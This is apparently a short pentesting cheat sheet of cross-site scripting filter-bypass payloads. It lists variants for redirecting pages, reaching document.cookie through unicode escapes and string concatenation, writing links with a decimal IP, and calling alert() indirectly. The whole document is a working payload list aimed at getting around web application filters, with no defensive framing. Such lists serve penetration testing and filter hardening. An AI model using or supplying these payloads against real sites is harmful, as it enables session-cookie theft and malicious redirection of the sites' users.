# XSS-Bypass-Filters

### Redirection
```
document.location=
document['location']=
window.location=
this["window"]["location"]=
document.location.href=
location.href=
location= 
```

### Link

```
//google.com/?=a
//134744072:1234/?a= (decimal ip)
```

### Cookies

```
document.cookie 
document['cookie']
with(document)alert(cookie)
doc\u0075ment.cookie
doc\u0075ment['cookie']
window["doc"+"ument"]["cookie"]
```

### Alert
```
alert(1)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```
